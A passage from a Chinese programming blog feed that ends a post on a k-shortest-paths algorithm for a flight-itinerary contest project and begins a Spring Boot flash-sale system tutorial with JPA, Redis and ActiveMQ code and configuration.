B为一个行程集合，其中包含所有最后一段行程，2.B中存在的行程一定能够到达终点。最后查询第一段行程对应的航班信息，其需要与B中的行程连边，连边的步骤与B中行程与C中行程连边步骤相同。这里还需要将起点和第一段行程对应的航班信息连一条边，边的权重为0，这一段行程记为A。<br>为了满足需要根据代理人匹配的需求，这里的节点会记录节点对应的航班能够到达终点的代理人的名称，在求出k条最短路径后只需要对每一个行程结果中的所有航班的代理人取交集即可。此时只需求得从起点到终点的k条最短路径即可。</p><p>算法的实现<br>我们以下图为例，求有向图中A到F的前k短路径。首先，我们构造图中关于F点的最短路径树。 构造完最短路径树之后，我们需要计算所有侧边的代价，然后将其放入一个字典中。这里侧边的代价指从某种情况偏离到要经过这条边的情况时需要增加的长度，计算方法为S(u,v)&#x3D;w(u,v)-dist(v)+dist(u)，S(u,v)为这条边的代价，w(u,v)为从u到v这条边的长度，dist(v)表示从v到终点F的最短路径的长度，dist(v)可以直接从最短路径树中获得。经过计算可得，这张图所有侧边的代价如下：<br>A-&gt;B：4；B-&gt;E：5；D-&gt;B：4；C-&gt;E：6<br>然后声明一个优先队列，队列用来存储侧边，并对队列中的数据侧边代价从小到大排序。队列的初始值为最短路径，其代价为0，队列中的数据为路径的隐式表示。之后经过k次循环，每次循环先取出队头元素，将其转换为显式表示，然后加入到答案中，之后将其隐式表示中终点的所有出边加入到队列中，经过k次循环后便有了k个答案。<br><img src="/upload/2022/09/image-a72d4aee5f594af3a7022b518f014dba.png" alt="image.png"><br>总体实现步骤如下：<br>（1）构造反图，构造最短路径树；<br>（2）计算所有侧边的代价集合S(u,v)&#x3D;w(u,v)-dist(v)+dist(u)；<br>（3）声明优先队列，将null-&gt;A入队；<br>（4）从优先队列中取出k次元素，获取k条最短路径，或者队列为空表示已经取出了所有最短路。每次更新时首先取出队头元素，将其转换为显示；然后加入到答案队列中；最后将当前路径的子节点入队。</p><p>计算侧边代价<br>计算侧边代价需要两个参数：图和最短路径树。首先获取图的所有边，之后通过最短路径树判断经过这条边能否到达终点，因为最短路径树只是记录能够从起点到达终点的唯一的最短路径，因此如果不能够到达终点，那么就证明不是最短路径，属于侧边。<br>假设此时侧边的两个顶点为u、v，根据以上公式：S(u,v)&#x3D;dist(u)-dist(v)+w(u,v)；u到终点的距离dist(u)，减去v到终点的距离dist(v)，再加上u到v的距离w(u,v)，即是侧边u到v的代价S(u,v)。再将此侧边的代价加入到侧边代价字典中即可。如果能够到达终点，那么就不是侧边，继续遍历图的边即可。</p><p>子节点的出边加入优先队列的过程<br>将子节点的出边加入优先队列需要5个参数：图、侧边代价的字典、当前边的隐式表示、当前路径表示第几个答案和优先队列。将子节点加入优先队列需要用到广度优先搜索，因此需要先声明一个栈，然后将当前节点的子节点的所有出边加入到栈中。当栈非空的时候，首先获取栈顶元素，如果当前栈顶元素的边是侧边，那么将当前栈顶元素的边的代价加上当前边的代价并添加到优先度列中。如果当前栈顶元素的边不是侧边，则将以当前栈顶元素的终点为起点的所有出边加入到栈中。重复上述过程直到栈非空即可。总体步骤如下：<br>1）初始化栈，将传入的隐式路径的所有终点作为起点，以这个起点为出边的所有边加入到栈用；<br>2）遍历栈，当栈非空的时候，获取栈顶元素进行如下操作；<br>3）如果这个元素是侧边则更新这条边的代价为传入的隐式路径的代价加上这条边的代价；<br>4）如果这个元素不是侧边，将这个元素所有终点作为起点，以这个起点为出边的所有边加入到栈用。</p><p>将路径的隐式表示转换为显示<br>路径的隐式表示需要记录这条路径中侧边的起点、终点、边的代价、父路径（从哪条路径更新来的）、经过这条边到达终点的总长度。在将隐式路径转换为显示时需要先获取父路径，然后从后向前遍历父路径，找到偏离点，之后将偏离点替换为隐式路径中的边，之后在最短路径树中找到隐式路径边的终点到最终终点的路径即可。例如有隐式路径为C-&gt;D，其从A-&gt;B-&gt;C-&gt;E-&gt;F更新而来，则偏离点为C，这条路径的显示表示的前半段为A-&gt;B-&gt;C，之后为C-&gt;D，之后从最短路径树中找到D-&gt;F的路径，例如为D-&gt;E-&gt;F，则这条路径的显示表示为A-&gt;B-&gt;C-&gt;D-&gt;E-&gt;F。<br>我们在计算过程中，存放的都是隐式路径，只有在最后需要计算的时候才会将根据存放的转化规则转化为显示路径。因为图的边是非常多的，因此采用隐式路径表示法能够大大提高程序的效率，避免大量计算。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>初赛过了之后为了参加答辩，又将文档进行了大改，前端界面也进一步完善。还录制了演示视频，这些都挺累人的，其实做一个系统不是特别难，为了应付各种各样的要求和文档才是麻烦事。不过后面好在比赛顺利，获取了国家二等奖。</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高并发秒杀系统</title>
    <link href="/2023/06/18/%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/06/18/%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>学习完SpringBoot,实际上只是大致过了一遍，很多注释和深入的原理都没怎么看懂，跟着书上的内容试着做一下这个秒杀项目，书名为《一步一步学SpringBoot》从这个项目中巩固所学习的内容。秒杀架构的设计主要思想有以下四点：</p><ol><li>缓存<br>将部分业务逻辑迁移到内存的缓存或者Redis中，从而极大的提高并发读效率。</li><li>削峰<br>秒杀开始的一瞬间会有一个瞬间流量峰值，如果使这个瞬间的流量峰值变得平缓是成功设计秒杀系统的关键。要实现流量的削峰填谷，一般的方法是采用缓存和MQ中间件。</li><li>异步<br>将同步业务设计成异步处理的任务，以提高网站的整体可用性。</li><li>限流<br>秒杀库存量一般很少，只有少部分用户才能秒杀成功，所以需要限制大部分用户流量，只准少量用户流量进入后端服务器。</li></ol><p>项目结构目录：<br><img src="/upload/2022/05/image-87634531d1df4908b5846ed9c446c59a.png" alt="image.png"></p><h1 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h1><h2 id="搭建开发环境"><a href="#搭建开发环境" class="headerlink" title="搭建开发环境"></a>搭建开发环境</h2><p>创建SpringBoot项目时选择创建Spring Initializr（初始化）项目，IDEA会自动配置默认的SpingBoot服务器URL：start.spring.io</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p>SpringBoot项目和Maven项目很像，有一个pom.xml文件，在其中已经自动添加了几个依赖和插件，除此之外该项目中还额外手动添加了以下依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-activemq<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JPA（Java Persistence API）是Sum公司官方提出的Java持久化规范，不提供实现，JPA的主要实现有Hibernate、EclipseLink、OpenJPA等。<br>Spring Data JPA的顶层接口是Repository，是一个空类，它的子类有CrudRepository、JpaRepository、PagingAndSortringRepository等。我们在使用时都是通过实现JpaRepository（包括增删改查分页接口）加上自己的业务方法。</p><p>thymeleaf是模板引擎，拥有丰富的标签语言和函数，在SpringBoot页面开发设计中一般采用thymeleaf编写html文件进行页面开发。</p><p>redis缓存，是被企业广泛使用的缓存。<br>使用方法：先在pom在加入redis依赖，然后在application.properties文件中添加配置信息（包括redis数据库(0)、服务器地址（localhost）、端口号（6379）、密码（空））。<br>redis的使用：在启动项目时会在监听器类中插入代码，将数据存放到redis缓存中，之后在service类中注入RedisTemplata对象就可以在缓存中进行相关操作了。redis的常用操作有：</p><ul><li>redisTemplate.opsForList().leftPushAll(ALL_USER,x) 查询缓存中所有用户数据,若ALL_USER键不存在，会创建该键及与其关联的List，之后再将参数中是x从左到右依次插入。</li><li>redisTemplate.opsForList().range(ALL_USER,0,-1) 取链表中的全部元素，0代表第一个元素，-1代表最后一个元素。</li></ul><p>JMS（Java Message Service）Java消息服务，是一组Java应用程序接口，提供消息的创建、发送、读取等一系列服务。JMS支持两种消息发送和接受模型，一种为P2P，基于队列的消息生产者发送消息到队列，消息消费者从队列中接受消息，队列的存在时消息的异步传输成为可能。另一种为Pub&#x2F;Sub,（Publish&#x2F;Subscribe）发布-订阅模型。定义了如何向一个内容节点（Topice）发布和订阅消息。该模型在消息的一对多广播时采用。</p><h3 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h3><p>里面是SpringBoot配置数据库、thymeleaf引擎、redis、mq的配置信息。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### mysql连接信息</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/speed-kill-system?serverTimezone=UTC</span></span><br><span class="line"><span class="comment">###用户名</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="comment">###密码</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">123456</span></span><br><span class="line"><span class="comment">###驱动</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#thymeleaf配置</span></span><br><span class="line"><span class="comment">#模板的模式，支持如：HTML、XML、TEXT、JAVASCRIPT等</span></span><br><span class="line"><span class="attr">spring.thymeleaf.mode</span>=<span class="string">HTML5</span></span><br><span class="line"><span class="comment">#编码，可不用配置</span></span><br><span class="line"><span class="attr">spring.thymeleaf.encoding</span>=<span class="string">UTF-8</span></span><br><span class="line"><span class="comment">#内容类别，可不用配置</span></span><br><span class="line"><span class="attr">spring.thymeleaf.servlet.content-type</span>=<span class="string">text/html</span></span><br><span class="line"><span class="comment">#开发配置为false，避免修改模板还要重启服务器</span></span><br><span class="line"><span class="attr">spring.thymeleaf.cache</span>=<span class="string">false</span></span><br><span class="line"><span class="comment">#配置模板路径，默认就是templates，可不用配置</span></span><br><span class="line"><span class="comment">#spring.thymeleaf.prefix=classpath:/templates/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">### redis缓存配置</span></span><br><span class="line"><span class="comment">### 默认redis数据库为db0</span></span><br><span class="line"><span class="attr">spring.redis.database</span>=<span class="string">0</span></span><br><span class="line"><span class="comment">### 服务器地址，默认为localhost</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">localhost</span></span><br><span class="line"><span class="comment">### 链接端口，默认为6379</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="comment">### redis密码默认为空</span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">### activemq 配置</span></span><br><span class="line"><span class="attr">spring.activemq.broker-url</span>=<span class="string">tcp://localhost:61616</span></span><br><span class="line"><span class="attr">spring.activemq.in-memory</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spring.activemq.pool.enabled</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">spring.activemq.packages.trust-all</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure><h2 id="model层"><a href="#model层" class="headerlink" title="model层"></a>model层</h2><p>创建项目相关实体类</p><h3 id="AyUser-java"><a href="#AyUser-java" class="headerlink" title="AyUser.java"></a>AyUser.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;ay_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyUser</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主键</span></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">//电话号码</span></span><br><span class="line">    <span class="keyword">private</span> String phoneNumber;</span><br><span class="line"><span class="comment">//省略get和set方法,以下同</span></span><br></pre></td></tr></table></figure><p>@Entity、@Table、@Id、@GeneratedValue 都是JPA的注解</p><ul><li>@Entity说明这个class是实体类，并且使用默认的orm规则，即class名即数据库表中表名，class字段名即表中的字段名</li><li>如果想改变这种默认的orm规则，就要使用@Table来改变class名与数据库中表名的映射规则，@Column来改变class中字段名与db中表的字段名的映射规则</li><li>@Id 标注用于声明一个实体类的属性映射为数据库的主键列。该属性通常置于属性声明语句之前，可与声明语句同行，也可写在单独行上。 </li><li>@GeneratedValue 用于标注主键的生成策略，通过strategy 属性指定。默认情况下，JPA 自动选择一个最适合底层数据库的主键生成策略：SqlServer对应identity，MySQL 对应 auto increment。</li></ul><h3 id="AyProduct-java"><a href="#AyProduct-java" class="headerlink" title="AyProduct.java"></a>AyProduct.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;ay_product&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyProduct</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">     <span class="comment">// 商品id</span></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="comment">// 商品图片</span></span><br><span class="line">    <span class="keyword">private</span> String productImg;</span><br><span class="line">    <span class="comment">// 商品名称</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">// 商品数量</span></span><br><span class="line">    <span class="keyword">private</span> Integer number;</span><br><span class="line">    <span class="comment">// 秒杀开始时间</span></span><br><span class="line">     <span class="keyword">private</span> Date startTime;</span><br><span class="line">    <span class="comment">// 秒杀结束时间</span></span><br><span class="line">    <span class="keyword">private</span> Date endTime;</span><br><span class="line">    <span class="comment">// 创建时间</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br></pre></td></tr></table></figure><h3 id="AyUserKillProduct-java"><a href="#AyUserKillProduct-java" class="headerlink" title="AyUserKillProduct.java"></a>AyUserKillProduct.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;ay_user_kill_product&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyUserKillProduct</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="comment">// 商品id</span></span><br><span class="line">    <span class="keyword">private</span> Integer productId;</span><br><span class="line">    <span class="comment">// 用户id</span></span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line">     <span class="comment">// 状态，-1：无效；0：成功；1：已付款&#x27;</span></span><br><span class="line">    <span class="keyword">private</span> Integer state;</span><br><span class="line">     <span class="comment">// 创建时间</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br></pre></td></tr></table></figure><h3 id="KillState-java"><a href="#KillState-java" class="headerlink" title="KillState.java"></a>KillState.java</h3><p>Java 枚举类使用 enum 关键字来定义，各个常量使用逗号 , 来分割。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">KillStatus</span> &#123;</span><br><span class="line"></span><br><span class="line">    IN_VALID(-<span class="number">1</span>, <span class="string">&quot;无效&quot;</span>),</span><br><span class="line">    SUCCESS(<span class="number">0</span>, <span class="string">&quot;成功&quot;</span>),</span><br><span class="line">    PAY(<span class="number">1</span>,<span class="string">&quot;已付款&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    KillStatus()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    KillStatus(<span class="type">int</span> code,String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>Spring Data JPA 是Spring Data的一个子项目，它通过提供基于JPA的Respository，极大地减少了JPA作为数据访问方案的代码量，通过该<br>框架开发者可以省略实现持久层业务逻辑的工作，唯一要做的就是声明持久层的接口，其他都交给Spring Data JPA来完成</p><p>SpringBoot中一般用三种方法访问数据库，分别是使用JDBC（JdbcTemplate）、使用Mybatis（配置、注解）、JPA（Repository）<br>详细介绍：<a href="https://blog.csdn.net/JavaSupeMan/article/details/105683959">https://blog.csdn.net/JavaSupeMan/article/details/105683959</a></p><h3 id="ProductRepository-java"><a href="#ProductRepository-java" class="headerlink" title="ProductRepository.java"></a>ProductRepository.java</h3><p>public interface ProductRepository extends JpaRepository&lt;T, ID&gt;,</p><p>根据上述描述：T 需要类型化为实体类(Entity)AyProduct，ID需要实体类AyProduct中Id（我定义的Id类型是Integer）的类型</p><p>负责商品的CRUD</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;AyProduct,Integer&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AyUserKillProductRepository-java"><a href="#AyUserKillProductRepository-java" class="headerlink" title="AyUserKillProductRepository.java"></a>AyUserKillProductRepository.java</h3><p>负责用户秒杀商品记录的CRUD</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AyUserKillProductRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;AyUserKillProduct,Integer&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h2><p>activemq中间件，MQ全称为MessageQueue消息队列，是一个消息的接受和转发的容器，可用于消息推送，ActiveMQ是Apache提供的一个开源的消息系统，完全由Java实现，因此能很好的支持J2EE提出的JMS规范。<br>使用方法：先引入依赖，再到application.properties配置文件中添加ActicveMQ配置，包括</p><ul><li>端口号 61616，</li><li>memory true,</li><li>enabled false,</li><li>信任所有的包trust-all true。</li></ul><p>之后需要创建Producer类和Consumer类，在Producer类中注入JmsMessagingTemplate类，该类是发消息的工具类，并创建方法sendMessage,方法中调用注入类的convertAndSend方法。<br>在Consumer类中使用@JmsListener标签来监听一个队列，并创建receiveQueue方法处理接收到的信息。<br>在实际使用时注入创建的Producer类，然后创建destination对象（创建消息队列），再往队列中发送消息即可。</p><h3 id="生产者开发"><a href="#生产者开发" class="headerlink" title="生产者开发"></a>生产者开发</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyProductKillProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//日志</span></span><br><span class="line">    <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ProductServiceImpl.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> JmsMessagingTemplate jmsMessagingTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  描述：发送消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> destination 目标地址</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> killProduct 描述商品</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(Destination destination, <span class="keyword">final</span> AyUserKillProduct killProduct)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;AyProductKillProducer sendMessage , killProduct is&quot;</span> + killProduct);</span><br><span class="line">        jmsMessagingTemplate.convertAndSend(destination, killProduct);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="消费者开发"><a href="#消费者开发" class="headerlink" title="消费者开发"></a>消费者开发</h3><p>通过SpringBoot实现队列消费，只需要通过@JmsListener(destination &#x3D; “queueName”) 注解，就可以实现对特定队列的消费</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyProductKillConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//日志</span></span><br><span class="line">    <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ProductServiceImpl.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AyUserKillProductService ayUserKillProductService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 消费消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> killProduct</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@JmsListener(destination = &quot;ay.queue.asyn.save&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveQueue</span><span class="params">(AyUserKillProduct killProduct)</span>&#123;</span><br><span class="line">        <span class="comment">//保存秒杀商品数据</span></span><br><span class="line">        ayUserKillProductService.save(killProduct);</span><br><span class="line">        <span class="comment">//记录日志</span></span><br><span class="line">        logger.info(<span class="string">&quot;ayUserKillProductService save, and killProduct: &quot;</span> + killProduct);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Service层"><a href="#Service层" class="headerlink" 